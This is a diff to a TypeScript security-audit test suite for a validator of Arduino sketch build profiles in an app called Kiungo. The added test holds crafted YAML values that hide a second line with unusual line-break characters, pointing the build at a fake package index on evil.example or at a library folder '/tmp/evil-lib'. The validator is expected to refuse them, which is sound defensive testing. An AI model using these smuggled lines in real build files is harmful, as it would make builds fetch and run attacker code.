@@ -29,7 +29,7 @@ describe("the build settings Kiungo builds with (security audit)", () => {
     }
   });
 
-  it("takes the file as Arduino CLI rewrites it: comments, CRLF, a second profile of Kiungo's boards", () => {
+  it("takes the file as Arduino CLI rewrites it: whole-line comments, CRLF, a second profile of Kiungo's boards", () => {
     const yaml = [
       "# Written by Kiungo",
       "profiles:",
@@ -40,7 +40,8 @@ describe("the build settings Kiungo builds with (security audit)", () => {
       "  kiungo:",
       "    fqbn: arduino:avr:mega:cpu=atmega2560",
       "    platforms:",
-      "      - platform: arduino:avr (1.8.6)  # the AVR core",
+      "      # the AVR core",
+      "      - platform: arduino:avr (1.8.6)",
       "    libraries:",
       "      - LiquidCrystal I2C (1.1.2)",
       "default_profile: kiungo",
@@ -61,7 +62,7 @@ describe("the build settings Kiungo builds with (security audit)", () => {
     expect(checkSketchProfile(`${UNO}    libraries:\n      - dir: "/opt/kiungo/hybrid/KiungoHybrid"\n`, { allowDirs: true })).toMatchObject({ ok: true, dirs: ["/opt/kiungo/hybrid/KiungoHybrid"] });
     // Install folders can have spaces, # and & in them: inside quotes they're the path, not YAML.
     const odd = "C:\\Users\\Ann & Co #1\\AppData\\Local\\Programs\\Kiungo\\resources\\hybrid\\KiungoHybrid";
-    expect(checkSketchProfile(`${UNO}    libraries:\n      - dir: ${JSON.stringify(odd)}  # Kiungo's runtime\n`, { allowDirs: true })).toMatchObject({ ok: true, dirs: [odd] });
+    expect(checkSketchProfile(`${UNO}    libraries:\n      - dir: ${JSON.stringify(odd)}\n`, { allowDirs: true })).toMatchObject({ ok: true, dirs: [odd] });
   });
 
   it("any other profile is held to the same rules", () => {
@@ -89,6 +90,17 @@ describe("the build settings Kiungo builds with (security audit)", () => {
     expect(refused(`${UNO}  kiungo:\n    fqbn: arduino:avr:uno\n`)).toMatch(/twice/);
     expect(refused(UNO.replace("    platforms:", "    fqbn: arduino:avr:mega:cpu=atmega2560\n    platforms:"))).toMatch(/twice/);
     expect(refused(`${UNO}profiles:\n`)).toMatch(/twice/);
+  });
+
+  it("no line can hide inside another: YAML's other line breaks, and text after a comment, are refused", () => {
+    // Found in review: Arduino CLI 1.5.1 read the hidden line and downloaded arduino:avr 9.9.9 from evil.example.
+    const hidden = (lineBreak: string) => UNO.replace("      - platform: arduino:avr (1.8.6)", `      - platform: arduino:avr (9.9.9) #x${lineBreak}        platform_index_url: https://evil.example/package_evil_index.json`);
+    for (const lineBreak of ["\r", "\u0085", "\u2028", "\u2029"]) expect(refused(hidden(lineBreak))).toMatch(/characters Kiungo never writes/);
+    expect(refused(`${UNO}    libraries:\n      - Servo (1.2.2) #x\r      - dir: /tmp/evil-lib\n`)).toMatch(/characters Kiungo never writes/);
+    expect(refused(`${UNO}    libraries:\n      - Servo (1.2.2)\u00a0#\n`)).toMatch(/characters Kiungo never writes/);
+    expect(refused(UNO.replace("arduino:avr (1.8.6)", "arduino:avr (1.8.6) # fine?"))).toMatch(/comment after a setting/);
+    // CRLF and trailing spaces are ordinary.
+    expect(checkSketchProfile(UNO.replace(/\n/g, "  \r\n")).ok).toBe(true);
   });
 
   it("library names follow the Arduino registry's rule", () => {
